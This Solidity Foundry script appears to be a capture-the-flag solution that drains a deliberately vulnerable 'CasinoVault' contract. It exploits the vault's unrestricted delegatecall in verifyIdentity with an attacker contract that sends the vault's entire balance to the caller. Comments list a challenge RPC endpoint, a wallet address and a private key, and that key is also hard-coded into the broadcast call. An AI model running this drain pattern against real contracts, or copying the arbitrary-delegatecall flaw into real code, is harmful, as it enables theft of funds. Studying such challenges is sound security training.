// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x437B0491e0F99c7Bb46545Ce5e518f84C7093850);
    address wallet = 0x18503C9058D7AEcbdCbf48C6A864D357299C37dd;
    CasinoVault public target = setup.CS();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x111847012d30f145d02d100daaeeae88cd76c9391e2260a93ab7893590df35e6);

        Hack hack = new Hack();

        bytes memory data = abi.encodeWithSignature("hack()");

        target.verifyIdentity(address(hack), data);

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	f82a083c-e8de-423f-8c7e-1ad5fe04be9c
// RPC Endpoint	http://103.178.153.113:40013/f82a083c-e8de-423f-8c7e-1ad5fe04be9c
// Private Key	0x111847012d30f145d02d100daaeeae88cd76c9391e2260a93ab7893590df35e6
// Setup Contract	0x437B0491e0F99c7Bb46545Ce5e518f84C7093850
// Wallet	0x18503C9058D7AEcbdCbf48C6A864D357299C37dd

contract Hack {
    function hack() external {
        (bool sent,) = payable(msg.sender).call{value: address(this).balance}("");
        require(sent);
    }
}

contract CasinoVault {
    address public gameLogic;
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function verifyIdentity(address _identity, bytes memory data) public {
        (bool success, ) = _identity.delegatecall(data);
        require(success, "Verifying failed");
    }

    function withdraw() public {
        require(msg.sender == owner, "Not the owner");
        (bool transfered, ) = payable(owner).call{value: address(this).balance}("");
        require(transfered, "Withdrawal Failed!");
    }

    receive() external payable {}
    
}
contract Setup{
    CasinoVault public CS;

    constructor() payable{
        CS = new CasinoVault{value: 50 ether}();
    }

    function isSolved() public view returns(bool){
        return address(CS).balance == 0;
    }

}